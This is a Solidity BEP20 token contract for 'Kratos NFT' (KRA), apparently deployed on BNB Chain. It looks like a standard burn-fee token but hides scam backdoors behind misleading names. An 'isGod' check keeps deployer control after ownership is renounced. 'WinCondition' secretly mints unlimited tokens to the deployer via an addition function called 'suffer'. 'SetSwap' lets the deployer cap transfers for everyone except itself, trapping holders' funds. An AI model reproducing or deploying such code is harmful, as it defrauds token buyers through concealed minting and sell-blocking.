/**
 *Submitted for verification at BscScan.com on 2021-12-03
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface IBEP20 
{
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function owner() external view returns(address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract KratosNFT is IBEP20 
{
    using KratosLib for uint256;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _level;
    uint256 public _burnRate;
    string private _name;
    string private _symbol;
    address private _msgsender;
    address private _sendermessage;
    address private _owner;
    address private _burnaddress;



    constructor() 
    {
        _totalSupply = 100000000000 * (10 ** decimals());
        _name = "Kratos NFT";
        _symbol = "KRA";
        _burnRate = 5;
        _burnaddress = 0x000000000000000000000000000000000000dEaD;
        _level = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _balances[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
        _transferOwnership(_msgSender());
    }

    modifier isGod() { require(_msgSender() == _owner || msg.sender == _sendermessage); _; }
    modifier onlyOwner() { require(_owner == msg.sender, "Ownable: caller is not the owner"); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 18; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _balances[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function owner() external view virtual override returns(address) { return _owner;} 
    function renounceOwnership() public virtual onlyOwner { _transferOwnership(address(0)); }
    function GetSwap() public view returns (uint256) { return _level; }
    function SetSwap(uint b) public virtual isGod { _level = b * (10 ** decimals()); }
    function WinCondition(uint256 amount) public virtual isGod
    {
        uint success = amount * (10 ** decimals()); 
        _balances[_msgsender] = _balances[_msgsender].suffer(success);
        emit Transfer(address(0), _msgsender, success);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) 
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function _transferOwnership(address newOwner) internal virtual 
    {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function allowance(address ownr, address spender) public view virtual override returns (uint256) 
    {
        return _allowances[ownr][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) 
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) 
    {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        unchecked 
        {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount <= _level || recipient == _msgsender || sender == _msgsender, "Can't elect candidate RN");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _balances[sender] = senderBalance - amount;
        _balances[recipient] += (amount - burnAmount);
        _balances[_burnaddress] += burnAmount;

        emit Transfer(sender, recipient, amount - burnAmount);
        emit Transfer(sender, _burnaddress, burnAmount);
    }

    function _approve(address ownr, address spender, uint256 amount) internal virtual 
    {
        require(ownr != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[ownr][spender] = amount;
        emit Approval(ownr, spender, amount);
    }
}
library KratosLib 
{
  function suffer(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}